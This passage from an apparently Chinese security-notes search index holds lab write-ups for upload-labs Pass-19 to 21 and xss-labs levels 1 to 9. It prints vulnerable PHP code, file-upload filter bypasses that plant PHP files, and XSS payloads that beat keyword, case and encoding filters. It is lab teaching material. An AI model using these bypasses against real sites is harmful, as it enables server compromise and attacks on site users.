\u3002\u6bd4\u5982\uff0c\u6bd4\u5982\uff01\u6bd4\u5982Apache\u4e0d\u8ba4\u8bc67z\uff0c\u90a3\u5c31\u4f1a\u5f80\u524d\u8bfb\u53d6\uff0c\u8fd9\u65f6\u5019\u5c31\u4f1a\u8bfb\u53d6\u5230php\uff0c\u6240\u4ee5\u4f60\u5728\u7528\u6d4f\u89c8\u5668\u8bbf\u95ee\u6b64\u6587\u4ef6\u7684\u65f6\u5019\uff0c\u4e5f\u4f1a\u6b63\u5e38\u8bfb\u53d6\u5230\u5176\u4e2d\u7684php\u5185\u5bb9\uff0c\u4f46\u662f\uff0c\u4f46\u662f\uff01\u4f46\u662f\u6b64\u5904\u7684\u767d\u540d\u5355\u4e2d\u6709 7z \u8fd9\u4e2a\u540e\u7f00\u3002</li> <li>\u6240\u4ee5\u6211\u4eec\u5148\u6253\u5f00Burp\u62e6\u622a\uff0c\u4e0a\u4f201.php\uff0c\u7136\u540e\u76f4\u63a5\u6539\u5305\u4e3a 1.php.7z \u7136\u540e\u50cf\u4e0a\u4e00\u5173\u4e00\u6837\u53d1\u9001\u5230\u7206\u7834\u6a21\u5f0f\uff0c\u9ad8\u5e76\u53d1\u6570\u653b\u51fb\u5373\u53ef\u3002</li> </ol>"},{"location":"WEB/labs/upload-labs%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/#pass-20","title":"Pass-20 \u903b\u8f91\u6f0f\u6d1e (\u5c0f\u6570\u70b9\u7ed5\u8fc7)","text":"<ol> <li>\u540e\u7aef\u4ee3\u7801\uff1a</li> </ol> <p>PHP<pre><code>$is_upload = false;\n$msg = null;\nif (isset($_POST['submit'])) {\n    if (file_exists(UPLOAD_PATH)) {\n        $deny_ext = array(\"php\",\"php5\",\"php4\",\"php3\",\"php2\",\"html\",\"htm\",\"phtml\",\"pht\",\"jsp\",\"jspa\",\"jspx\",\"jsw\",\"jsv\",\"jspf\",\"jtml\",\"asp\",\"aspx\",\"asa\",\"asax\",\"ascx\",\"ashx\",\"asmx\",\"cer\",\"swf\",\"htaccess\");\n\n        $file_name = $_POST['save_name'];\n        $file_ext = pathinfo($file_name,PATHINFO_EXTENSION);\n\n        if(!in_array($file_ext,$deny_ext)) {\n            $temp_file = $_FILES['upload_file']['tmp_name'];\n            $img_path = UPLOAD_PATH . '/' .$file_name;\n            if (move_uploaded_file($temp_file, $img_path)) { \n                $is_upload = true;\n            }else{\n                $msg = '\u4e0a\u4f20\u51fa\u9519\uff01';\n            }\n        }else{\n            $msg = '\u7981\u6b62\u4fdd\u5b58\u4e3a\u8be5\u7c7b\u578b\u6587\u4ef6\uff01';\n        }\n\n    } else {\n        $msg = UPLOAD_PATH . '\u6587\u4ef6\u5939\u4e0d\u5b58\u5728,\u8bf7\u624b\u5de5\u521b\u5efa\uff01';\n    }\n}\n</code></pre> 2. \u4ece\u540e\u7aef\u4ee3\u7801\u4e2d\u53ef\u4ee5\u770b\u51fa\uff0c\u6211\u4eec\u53ef\u4ee5\u7528\u5f88\u591a\u4e2d\u65b9\u6cd5\u7ed5\u8fc7\uff0c\u6bd4\u5982\u8bf4\u6587\u4ef6\u9009\u62e9\u4e00\u4e2aphp\u6587\u4ef6\uff0c\u4fdd\u5b58\u540d\u79f0\u6539\u4e3a1.php. \uff0c\u7136\u540e\u5229\u7528windows\u4f1a\u81ea\u52a8\u5220\u9664\u6700\u540e\u7684\u70b9\u548c\u7a7a\u683c\u6765\u7ed5\u8fc7\u3002 3. \u6211\u4eec\u770b\u4e00\u770b\u4e0a\u9762\u7684\u4ee3\u7801\uff0c\u5b83\u4f7f\u7528 pathinfo($file_name,PATHINFO_EXTENSION) \u7684\u65b9\u5f0f\u68c0\u67e5\u6587\u4ef6\u540d\u540e\u7f00 (\u4ece\u6700\u540e\u4e00\u4e2a\u5c0f\u6570\u70b9\u8fdb\u884c\u622a\u53d6) \uff0c\u5e76\u4f7f\u7528\u7684\u662f\u9ed1\u540d\u5355\u673a\u5236\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u5728\u4fdd\u5b58\u540d\u79f0\u5904\u6539\u4e3a1.php. 4. \u518d\u770b\u4e00\u770b\u6e90\u7801\uff0c\u53d1\u73b0 move_uploaded_file() \u51fd\u6570\u4e2d\u7684 img_path \u662f\u7531 post \u53c2\u6570 save_name \u63a7\u5236\u7684\uff0c\u56e0\u6b64\u53ef\u4ee5\u5728 save_name \u5229\u7528 00 \u622a\u65ad\u7ed5\u8fc7\uff08Pass-13\uff09</p> <p>move_uploaded_file() \u7279\u6027\uff1a  /.\u5728\u5bf9\u6bd4\u9ed1\u540d\u5355\u7684\u65f6\u5019\u4f1a\u5ffd\u7565</p>"},{"location":"WEB/labs/upload-labs%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/#pass-21","title":"Pass-21 \u903b\u8f91\u6f0f\u6d1e (\u6570\u7ec4\u7ed5\u8fc7)","text":"<ol> <li>\u540e\u7aef\u4ee3\u7801\u957f\u8fd9\u6837\uff1a</li> </ol> <p>PHP<pre><code>$is_upload = false;\n$msg = null;\nif(!empty($_FILES['upload_file'])){\n    //\u68c0\u67e5MIME\n    $allow_type = array('image/jpeg','image/png','image/gif');\n    if(!in_array($_FILES['upload_file']['type'],$allow_type)){\n        $msg = \"\u7981\u6b62\u4e0a\u4f20\u8be5\u7c7b\u578b\u6587\u4ef6!\";\n    }else{\n        //\u68c0\u67e5\u6587\u4ef6\u540d\n        $file = empty($_POST['save_name']) ? $_FILES['upload_file']['name'] : $_POST['save_name'];\n        if (!is_array($file)) {\n            $file = explode('.', strtolower($file));\n        }\n\n        $ext = end($file);\n        $allow_suffix = array('jpg','png','gif');\n        if (!in_array($ext, $allow_suffix)) {\n            $msg = \"\u7981\u6b62\u4e0a\u4f20\u8be5\u540e\u7f00\u6587\u4ef6!\";\n        }else{\n            $file_name = reset($file) . '.' . $file[count($file) - 1];\n            $temp_file = $_FILES['upload_file']['tmp_name'];\n            $img_path = UPLOAD_PATH . '/' .$file_name;\n            if (move_uploaded_file($temp_file, $img_path)) {\n                $msg = \"\u6587\u4ef6\u4e0a\u4f20\u6210\u529f\uff01\";\n                $is_upload = true;\n            } else {\n                $msg = \"\u6587\u4ef6\u4e0a\u4f20\u5931\u8d25\uff01\";\n            }\n        }\n    }\n}else{\n    $msg = \"\u8bf7\u9009\u62e9\u8981\u4e0a\u4f20\u7684\u6587\u4ef6\uff01\";\n}\n</code></pre> 2. \u91cc\u9762\u6709\u4e00\u4e2a\u4e1c\u897f\u5e94\u8be5\u6ce8\u610f\uff1a<code>$file = explode('.', strtolower($file));</code>\uff0c\u8fd9\u662f\u628a\u6587\u4ef6\u540d\u901a\u8fc7\u201c . \u201d\u8fdb\u884c\u5206\u5272\uff0c\u751f\u6210\u4e00\u4e2a\u6570\u7ec4\uff08 explode() \u51fd\u6570\u628a\u5b57\u7b26\u4e32\u6253\u6563\u4e3a\u6570\u7ec4\uff09\uff0c\u7136\u540e end()  \u51fd\u6570\u5c06\u6570\u7ec4\u5185\u90e8\u6307\u9488\u6307\u5411\u6700\u540e\u4e00\u4e2a\u5143\u7d20\uff0c\u5e76\u8fd4\u56de\u8be5\u5143\u7d20\u7684\u503c\uff08\u5982\u679c\u6210\u529f\uff09\u3002reset() \u51fd\u6570\u5c06\u5185\u90e8\u6307\u9488\u6307\u5411\u6570\u7ec4\u4e2d\u7684\u7b2c\u4e00\u4e2a\u5143\u7d20\u5e76\u8f93\u51fa\u3002 3. \u56e0\u4e3a\u5b83\u7684\u903b\u8f91\u662f\u5982\u679c\u6ca1\u6709\u6570\u7ec4\u5219\u521b\u5efa\u4e00\u4e2a\u6570\u7ec4\uff0c\u90a3\u4e48\u5982\u679c\u6211\u4eec\u76f4\u63a5\u4e0a\u4f20\u4e00\u4e2a\u6570\u7ec4\u5c31\u53ef\u4ee5\u7ed5\u8fc7 4. \u6211\u4eec\u5148\u4e0a\u4f20\u6587\u4ef6\uff0c\u7528Burp\u62e6\u622a\uff0c\u5c06 content-type \u4fee\u6539\u4e3a\u5408\u6cd5\u503c\uff0c\u6211\u4eec\u6784\u9020\u6570\u7ec4\u7684\u65f6\u5019\uff0c\u5c06\u7b2c\u4e00\u4e2a\u6570\u7ec4\u5305\u542b\u201c .php \u201d\uff0c\u6700\u540e\u4e00\u4e2a\u6570\u7ec4\u662f\u201c .jpg \u201d\u7b49\u5408\u6cd5\u540e\u7f00\u3002\u5176\u5b9e\u6700\u540e\u4e00\u4e2a\u6570\u7ec4\u53ef\u4ee5\u6539\u4e3a\u5927\u4e00\u4e9b\u7684\uff0c\u6bd4\u5982\u539f\u6765\u6570\u7ec4\u6309\u6b63\u5e38\u53ea\u6709\u4e24\u4e2a\u503c\uff0c\u6211\u4eec\u76f4\u63a5arr[10]\u4e3apng\uff0c\u8fd9\u65f6\u5019\u4f1a\u5c06\u6570\u7ec4\u6491\u5927\uff0c\u5176\u4e2d\u7684\u6570\u7ec4\u503c\u4e3a\u7a7a\uff0c\u8fd9\u65f6\u5019\u6211\u4eec\u4e0a\u4f20\u4e0a\u53bb\u4fbf\u4e3a\u6570\u7ec4\u7b2c\u4e00\u4e2a\u5143\u7d20\u7684\u503c\uff0c\u540e\u9762\u62fc\u63a5\u597d\u201c . \u201d\uff0c\u800cwindows\u81ea\u52a8\u5220\u9664\u6700\u540e\u7684\u70b9\u3002</p>"},{"location":"WEB/labs/xss-labs%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/","title":"Xss labs\u9776\u573a\u6253\u9776\u8bb0\u5f55","text":""},{"location":"WEB/labs/xss-labs%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/#level-1","title":"level-1 \u65e0\u8fc7\u6ee4\u673a\u5236","text":"<p>http://127.0.0.1/xss-labs/level1.php?name=test</p> <ol> <li> <p>\u6211\u4eec\u5148\u770b\u4e00\u770b\u9875\u9762\uff1a\u89c2\u5bdf\u53d1\u73b0\uff0cURL\u4e2d\u53ef\u4ee5\u8f93\u5165\u53c2\u6570\uff0c\u800c\u9875\u9762\u4f1a\u56de\u663e\u53c2\u6570\u4ee5\u53ca\u53c2\u6570\u7684\u957f\u5ea6\u3002</p> </li> <li> <p>\u6211\u4eec\u770b\u4e00\u4e0b\u9875\u9762\u6e90\u7801\uff0c\u53d1\u73b0\u6211\u4eec\u8f93\u5165\u7684\u5185\u5bb9\u4f1a\u88ab\u76f4\u63a5\u62fc\u63a5\u5728\u9875\u9762\u4e2d\u3002</p> </li> <li>\u56e0\u6b64\u6211\u4eec\u5c06URL\u4e2d\u7684\u4e2d\u7684 \u201ctest\u201d \u4fee\u6539\u4e3a \u201c<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>\uff0c\u6210\u529f\u5f39\u7a97\u3002</li> <li>\u540e\u7aef\u4ee3\u7801\u5982\u4e0b\uff08\u6211\u4eec\u8f93\u5165\u7684\u53c2\u6570\u5728\u88abget\u5230\u7684\u65f6\u5019\u6ca1\u6709\u7ecf\u8fc7\u7279\u6b8a\u7684\u8fc7\u6ee4\u5904\u7406\uff09\uff1a</li> </ol> PHP<pre><code>&lt;?php \nini_set(\"display_errors\", 0);\n$str = $_GET[\"name\"];\necho \"&lt;h2 align=center&gt;\u6b22\u8fce\u7528\u6237\".$str.\"&lt;/h2&gt;\";\n?&gt;\n</code></pre>"},{"location":"WEB/labs/xss-labs%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/#level-2","title":"level-2 \u95ed\u5408\u6807\u7b7e","text":"<p>http://127.0.0.1/xss-labs/level2.php?keyword=test</p> <ol> <li>\u8fd9\u4e00\u5173\u6709\u4e86\u8f93\u5165\u6846\uff0c\u6211\u4eec\u5148\u8f93\u5165<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>\u8bd5\u4e00\u8bd5\uff0c\u53d1\u73b0\u6ca1\u6709\u6210\u529f</li> <li>\u6211\u4eec\u5728\u7b2c\u4e00\u6b65\u7684\u57fa\u7840\u4e0a\u8fdb\u9875\u9762\u6e90\u7801\u770b\u4e00\u770b\uff1a</li> <li>\u6211\u4eec\u53d1\u73b0\uff0c\u5728\u9875\u9762\u4e0a\u8f93\u51fa\u7684\u5185\u5bb9\u88ab\u8f6c\u4e49\u4e86\uff0c\u4f46\u662fvalue\u5c5e\u6027\u4e2d\u7684\u5e76\u6ca1\u6709\u88ab\u8f6c\u79fb\uff0c\u4f46\u662f\u95ee\u9898\u662f\u8fd9\u91cc\u7684js\u4ee3\u7801\u5728\u6807\u7b7e\u5c5e\u6027\u503c\u4e2d\uff0c\u6d4f\u89c8\u5668\u662f\u65e0\u6cd5\u6267\u884c\u7684\u3002\u56e0\u6b64\u6211\u4eec\u60f3\u529e\u6cd5\u53bb\u95ed\u5408\uff0c\u6211\u4eec\u8f93\u5165<code>\"&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code>\uff0c\u8fdb\u884c\u95ed\u5408\uff0c\u95ed\u5408\u4e4b\u540e\u7684\u4e3a\u201c<code>&lt;input name=\"keyword\" value=\"\"&gt;&lt;script&gt;alert(1)&lt;/script&gt;\"&gt;</code>\u201d\uff0c\u6210\u529f\u5f39\u7a97\u3002</li> <li>\u6211\u4eec\u770b\u4e00\u770b\u540e\u7aef\u4ee3\u7801\uff1a\uff08\u7528 htmlspecialchars() \u5bf9\u8f93\u5165\u7684\u5b57\u7b26\u8fdb\u884c\u4e86\u8f6c\u4e49\uff09 \u70b9\u6b64\u5b66\u4e60 htmlspecialchars() \u51fd\u6570</li> </ol> PHP<pre><code>&lt;?php\n    ini_set(\"display_errors\", 0);\n    $str = $_GET[\"keyword\"];\n    echo \"&lt;h2 align=center&gt;\u6ca1\u6709\u627e\u5230\u548c\" . htmlspecialchars($str) . \"\u76f8\u5173\u7684\u7ed3\u679c.&lt;/h2&gt;\" . '&lt;center&gt;\n&lt;form action=level2.php method=GET&gt;\n&lt;input name=keyword  value=\"' . $str . '\"&gt;\n&lt;input type=submit name=submit value=\"\u641c\u7d22\"/&gt;\n&lt;/form&gt;\n&lt;/center&gt;';\n    ?&gt;\n</code></pre>"},{"location":"WEB/labs/xss-labs%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/#level-3-htmlspecialchars","title":"level-3 \u5355\u5f15\u53f7\u95ed\u5408+htmlspecialchars()","text":"<p>http://127.0.0.1/xss-labs/level3.php?writing=wait</p> <ol> <li>\u6211\u4eec\u4f9d\u65e7\u662f\u5148\u8f93\u5165<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>\uff0c\u6ca1\u6709\u4f5c\u7528\uff0c\u67e5\u770b\u7f51\u9875\u6e90\u7801\uff0c\u53d1\u73b0\u9875\u9762\u8f93\u51fa\u5185\u5bb9\u548c value \u5c5e\u6027\u503c\u90fd\u88ab\u8f6c\u4e49\u4e86</li> <li>\u89c2\u5bdf\u53d1\u73b0\uff0c\u4e0a\u56fe\u4e2d\u7684\u5355\u5f15\u53f7\u5e76\u6ca1\u6709\u88ab\u8f6c\u4e49\uff0c\u6211\u4eec\u5c06\u5355\u5f15\u53f7\u95ed\u5408\uff0c\u5e76\u4f7f\u7528\u4e00\u79cd\u4e0d\u9700\u8981\u5c16\u62ec\u53f7\u7b49\u7684JS\u65b9\u6cd5\uff0c\u6211\u4eec\u8f93\u5165 <code>'onclink='alert(1)</code> \uff0c\u6210\u529f\u5f39\u7a97\u3002 \u5f53\u6211\u4eec\u8f93\u5165\u4e4b\u540e\u7684\u5b8c\u6574\u4ee3\u7801\u4e3a\uff1a<code>&lt;input name=\"keyword\" value=' ' onclick='alert(1)'&gt;</code> \uff08\u4e5f\u53ef\u4ee5 <code>'onclick='javascript:alert(1)</code> \uff09</li> <li>\u6211\u4eec\u770b\u4e00\u770b\u540e\u7aef\u6e90\u7801\uff1a\uff08\u786e\u5b9e\u662f\u5bf9\u4e24\u4e2a\u5730\u65b9\u90fd\u8fdb\u884c\u4e86\u8f6c\u4e49\uff09</li> </ol>"},{"location":"WEB/labs/xss-labs%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/#level-4","title":"level-4 \u53cc\u5f15\u53f7\u95ed\u5408+\u6dfb\u52a0\u4e8b\u4ef6","text":"<p>http://127.0.0.1/xss-labs/level4.php?keyword=try harder!</p> <ol> <li>\u6211\u4eec\u4f9d\u65e7\u662f <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> \u6d4b\u8bd5\uff0c\u67e5\u770b\u7f51\u9875\u6e90\u7801\uff0c\u53d1\u73b0\u5c16\u62ec\u53f7\u76f4\u63a5\u5c31\u6ca1\u6709\u4e86</li> <li>\u90a3\u6211\u4eec\u8fd8\u662f\u50cf\u4e0a\u4e00\u5173\u4e00\u6837\uff0c\u4f7f\u7528\u4e0d\u9700\u8981\u5c16\u62ec\u53f7\u7684\u5199\u6cd5\uff0c\u4f46\u662f\u4e0a\u4e00\u5173\u662f\u5355\u5f15\u53f7\u95ed\u5408\uff0c\u800c\u8fd9\u4e00\u5173\u662f\u53cc\u5f15\u53f7\uff0c\u90a3\u6211\u4eec\u5c31\u6539\u6210 <code>\"onclick=\"alert(1)</code> \u6216\u8005 <code>\"onclick=\"javascript:alert(1)</code> \uff0c\u6210\u529f\u5f39\u7a97\u3002</li> <li>\u6211\u4eec\u770b\u4e00\u770b\u540e\u7aef\u4ee3\u7801\uff1a\u53d1\u73b0\u662f\u4f7f\u7528 replace \u5bf9\u5c16\u62ec\u53f7\u7b49\u8fdb\u884c\u4e86\u66ff\u6362\u3002</li> </ol> PHP<pre><code>$str = $_GET[\"keyword\"];\n$str2 = str_replace(\"&gt;\", \"\", $str);\n$str3 = str_replace(\"&lt;\", \"\", $str2);\n</code></pre>"},{"location":"WEB/labs/xss-labs%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/#level-5-javascript","title":"level-5 JavaScript \u4f2a\u534f\u8bae","text":"<p>http://127.0.0.1/xss-labs/level5.php?keyword=find a way out!</p> <ol> <li> <p>\u6211\u4eec\u8fd8\u662f <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> \uff0c\u7136\u540e\u770b\u9875\u9762\u6e90\u7801\uff0c\u53d1\u73b0 value \u5c5e\u6027\u503c\u53d8\u6210\u4e86 <code>&lt;scr_ipt&gt;alert(1)&lt;/script&gt;</code>\uff08\u4e0b\u5212\u7ebf\uff09  \u6211\u4eec\u518d\u5c1d\u8bd5 <code>\"&gt;onclick=\"alert(1)</code> \uff0c\u67e5\u770b\u9875\u9762\u6e90\u7801\uff0c value \u5904\u6210\u4e86 <code>value=\"\"&gt;o_nclick=\"alert(1)\"</code>\uff08\u4e0b\u5212\u7ebf\uff09     \u8bf4\u660e\u540e\u7aef\u4f1a\u5bf9 script \u548c onclick \u8fdb\u884c\u8fc7\u6ee4\u3002     </p> </li> <li> <p>\u67e5\u8d44\u6599\uff0c\u5f97\u77e5\u5e94\u8be5\u7528 a \u6807\u7b7e\u7ed5\u8fc7\uff0c\u4f7f\u7528 JS\u4f2a\u534f\u8bae( <code>javascript:alert(1)</code> )\u7ed5\u8fc7\uff0c\u7b80\u5355\u8bf4\u5c31\u662f\u628a javascript:  \u540e\u9762\u7684\u4ee3\u7801\u5f53\u6210  javascript \u6765\u6267\u884c\u3002</p> </li> <li>\u56e0\u6b64\u6211\u4eec\u8f93\u5165 <code>\"&gt;&lt;a href=javascript:alert(1)&gt;</code> \uff08\u7528 \"&gt; \u8fdb\u884c\u95ed\u5408\uff09\uff0c\u6210\u529f\u5f39\u7a97\u3002</li> <li>\u770b\u770b\u540e\u7aef\u4ee3\u7801\uff1a PHP<pre><code>$str = strtolower($_GET[\"keyword\"]);\n$str2 = str_replace(\"&lt;script\", \"&lt;scr_ipt\", $str);\n$str3 = str_replace(\"on\", \"o_n\", $str2);\n</code></pre></li> </ol>"},{"location":"WEB/labs/xss-labs%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/#level-6","title":"level-6 \u5927\u5c0f\u5199\u7ed5\u8fc7","text":"<p>http://127.0.0.1/xss-labs/level6.php?keyword=break it out!</p> <ol> <li>\uff08\u8fd9\u4e00\u6b65\u548c\u4e0a\u4e00\u5173\u4e00\u6a21\u4e00\u6837\uff09\u6211\u4eec\u8fd8\u662f <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> \uff0c\u7136\u540e\u770b\u9875\u9762\u6e90\u7801\uff0c\u53d1\u73b0 value \u5c5e\u6027\u503c\u53d8\u6210\u4e86 <code>&lt;scr_ipt&gt;alert(1)&lt;/script&gt;</code>\uff08\u4e0b\u5212\u7ebf\uff09  \u6211\u4eec\u518d\u5c1d\u8bd5 <code>\"&gt;onclick=\"alert(1)</code> \uff0c\u67e5\u770b\u9875\u9762\u6e90\u7801\uff0c value \u5904\u6210\u4e86 <code>value=\"\"&gt;o_nclick=\"alert(1)\"</code>\uff08\u4e0b\u5212\u7ebf\uff09     \u8bf4\u660e\u540e\u7aef\u4f1a\u5bf9 script \u548c onclick \u8fdb\u884c\u8fc7\u6ee4\u3002</li> <li>\u6211\u4eec\u50cf\u4e0a\u4e00\u5173\u4e00\u6837\u4f7f\u7528 JS\u4f2a\u534f\u8bae\uff0c\u53d1\u73b0\u4f9d\u65e7\u4e0d\u884c\uff0c\u5c45\u7136 href \u4e5f\u88ab\u66ff\u6362\u6210\u4e86 hr_ef </li> <li>\u4f46\u662f\u5b83\u5e76\u6ca1\u6709\u505a\u5927\u5c0f\u5199\u8fc7\u6ee4\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u4ee5\u4e0b\u4e09\u79cd\u65b9\u6cd5\uff1a</li> <li><code>\"&gt;&lt;sCript&gt;alert()&lt;/sCript&gt;&lt;\"</code></li> <li><code>\"Onfocus=javascript:alert()\"</code> \uff08\u8fd9\u79cd\u548c\u4e0b\u9762\u90a3\u79cd\u53ea\u662f\u5c11\u4e86\u7a7a\u683c\u800c\u5df2\uff0c\u4f46\u662f\u4e0d\u884c\uff0c\u81f3\u4e8e\u4e3a\u5565\uff0c\u8bf7\u770b\u7b2c\u56db\u6b65\uff09</li> <li><code>\"Onfocus=javascript:alert() \"</code></li> <li> <p><code>\"&gt;&lt;a hRef=javascript:alert()&gt;&lt;\"</code></p> </li> <li> <p>\u6211\u4eec\u6765\u89e3\u51b3\u4e0a\u4e00\u6b65\u4e2d\u4ea7\u751f\u7684\u95ee\u9898\uff1a\u4e3a\u4ec0\u4e48 <code>\"Onfocus=javascript:alert()\"</code> \u4e0d\u53ef\u4ee5\uff0c\u4f46\u662f <code>\" Onfocus=javascript:alert() \"</code>\u53ef\u4ee5\uff08\u4e8c\u8005\u53ea\u662f\u5dee\u4e86 alert() \u540e\u9762\u7684\u7a7a\u683c\u800c\u5df2\uff09\u3002\u8bf7\u770b\u4e0b\u56fe\uff1a   \u770b\u51fa\u533a\u522b\u4e86\u5427\uff0c\u6ca1\u6709\u7a7a\u683c\u7684\u65f6\u5019 alert() \u540e\u9762\u7684\u4e24\u4e2a\u5f15\u53f7\u5f62\u6210\u4e86\u95ed\u5408\uff0c\u800c\u6709\u7a7a\u683c\u7684\u65f6\u5019\uff0c\u5219\u4e00\u5207\u6b63\u5e38\u3002</p> </li> <li> <p>\u6211\u4eec\u770b\u4e00\u770b\u540e\u7aef\u4ee3\u7801\uff1a</p> </li> </ol> PHP<pre><code> $str = $_GET[\"keyword\"];\n $str2 = str_replace(\"&lt;script\", \"&lt;scr_ipt\", $str);\n $str3 = str_replace(\"on\", \"o_n\", $str2);\n $str4 = str_replace(\"src\", \"sr_c\", $str3);\n $str5 = str_replace(\"data\", \"da_ta\", $str4);\n $str6 = str_replace(\"href\", \"hr_ef\", $str5);\n</code></pre>"},{"location":"WEB/labs/xss-labs%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/#level-7","title":"level-7 \u53cc\u5199\u7ed5\u8fc7","text":"<p>http://127.0.0.1/xss-labs/level7.php?keyword=move up!</p> <ol> <li>\u6211\u4eec\u4f9d\u65e7\u662f\u5c1d\u8bd5 <code>&lt;script&gt;alert()&lt;/script&gt;</code>\uff0c\u7ed3\u679c\u76f4\u63a5\u628a <code>&lt;script&gt;&lt;/script&gt;</code> \u7ed9\u6ca1\u4e86\uff0c\u8fd9\u5f88\u53ef\u80fd\u662f\u68c0\u6d4b\u5230 script \u6807\u7b7e\u7136\u540e\u8fdb\u884c\u4e86\u66ff\u6362\uff0c\u90a3\u6211\u4eec\u5c31\u5c1d\u8bd5\u53cc\u5199\u7ed5\u8fc7 </li> <li>\u6211\u4eec\u5c1d\u8bd5\u4e00\u4e0b\u5185\u5bb9\uff1a\u6210\u529f\u5f39\u7a97</li> <li><code>\"&gt; &lt;a hrehreff=javasscriptcript:alert()&gt;</code></li> <li> <p><code>\"&gt;&lt;scscriptript&gt;alert(1)&lt;/sscriptcript&gt;</code></p> </li> <li> <p>\u6211\u4eec\u770b\u4e00\u770b\u540e\u7aef\u4ee3\u7801\uff1a\u4f9d\u65e7\u662f\u505a\u4e86\u66ff\u6362\uff08\u95ee\u9898\u5728\u4e8e\u53ea\u8fc7\u6ee4\u4e86\u4e00\u6b21\uff09 PHP<pre><code>$str = strtolower($_GET[\"keyword\"]);\n$str2 = str_replace(\"script\", \"\", $str);\n$str3 = str_replace(\"on\", \"\", $str2);\n$str4 = str_replace(\"src\", \"\", $str3);\n$str5 = str_replace(\"data\", \"\", $str4);\n$str6 = str_replace(\"href\", \"\", $str5);\n</code></pre></p> </li> </ol>"},{"location":"WEB/labs/xss-labs%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/#level-8","title":"level-8 \u7f16\u7801\u7ed5\u8fc7","text":"<p>http://127.0.0.1/xss-labs/level8.php?keyword=nice try!</p> <ol> <li>\u6211\u4eec\u6d4b\u8bd5\u53d1\u73b0\uff0c\u5927\u5c0f\u5199\u7ed5\u8fc7 \u53cc\u5199\u7ed5\u8fc7 JS\u4f2a\u534f\u8bae \u2026\u2026\u5404\u79cd\u4e1c\u897f\u90fd\u88ab\u9650\u5236\u4e86\uff0c\u7136\u540e\u6211\u4eec\u8f93\u5165\u5185\u5bb9\u4e4b\u540e\u70b9\u51fb \u201c\u53cb\u60c5\u94fe\u63a5\u201d \u4f1a\u8df3\u8f6c\uff0c\u90a3\u6211\u4eec\u5c31\u5c1d\u8bd5\u5728\u8fd9\u91cc\u505a\u52a8\u4f5c\u3002</li> <li> <p>\u67e5\u8d44\u6599\uff1a\u6211\u4eec\u80fd\u5229\u7528 href \u7684\u9690\u85cf\u5c5e\u6027\u81ea\u52a8 Unicode \u89e3\u7801\uff0c\u6211\u4eec\u53ef\u4ee5\u63d2\u5165\u4e00\u6bb5 js \u4f2a\u534f\u8bae <code>javascript:alert()</code> \u6211\u4eec\u5c06\u5176URL\u7f16\u7801\uff0c\u5f97\u5230\uff1a<code>&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;![1](./xss-labs/8/1.jpg)&amp;#40;&amp;#41;</code> \u6210\u529f\u5f39\u7a97</p> </li> <li> <p>\u540e\u53f0\u6e90\u4ee3\u7801\u5206\u6790\u3002\u5c06 keyword \u63d0\u4ea4\u7684\u53d8\u91cf\u8f6c\u6362\u4e3a\u5c0f\u5199\uff0c\u66ff\u6362\u5173\u952e\u5b57 script\u3001on\u3001src\u3001data\u3001href\u3001\"\uff0c\u7136\u540e\u8f93\u51fa\u5728a\u6807\u7b7e\u7684href\u5c5e\u6027\u4e2d\u3002 PHP<pre><code>$str = strtolower($_GET[\"keyword\"]);\n$str2 = str_replace(\"script\", \"scr_ipt\", $str);\n$str3 = str_replace(\"on\", \"o_n\", $str2);\n$str4 = str_replace(\"src\", \"sr_c\", $str3);\n$str5 = str_replace(\"data\", \"da_ta\", $str4);\n$str6 = str_replace(\"href\", \"hr_ef\", $str5);\n$str7 = str_replace('\"', '&amp;quot', $str6);\n</code></pre></p> </li> </ol>"},{"location":"WEB/labs/xss-labs%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/#level-9","title":"level-9 \u68c0\u6d4b\u5173\u952e\u5b57","text":"<p>http://127.0.0.1/xss-labs/level9.php?keyword=not bad!</p> <ol> <li> <p>\u4f9d\u65e7\u662f\u201c\u53cb\u60c5\u94fe\u63a5\u201d\uff0c\u90a3\u6211\u4eec\u5c31\u628a\u4e0a\u4e00\u5173\u7684\u62ff\u8fc7\u6765\u8bd5\u4e00\u8bd5\uff0c\u7ed3\u679c\u63d0\u793a\u201c\u60a8\u7684\u94fe\u63a5\u4e0d\u5408\u6cd5\uff1f\u6709\u6ca1\u6709\uff01\u201d\uff0c\u94fe\u63a5\u5408\u6cd5\uff0c\u6211\u4eec\u8003\u8651\u4e00\u4e0b http \u6216\u8005 https \u534f\u8bae\uff0c\u4f46\u662f\u5176\u5b9e\u8fd9\u91cc\u4f1a\u6709\u4e24\u79cd\u53ef\u80fd\uff0c\u4e00\u79cd\u662f\u5f00\u5934\u5fc5\u987b\u662f http \u7b49\u5b57\u6837\uff0c\u53e6\u4e00\u79cd\u662f\u5b57\u7b26\u4e32\u4e2d\u4e0d\u7ba1\u54ea\u91cc\u6709 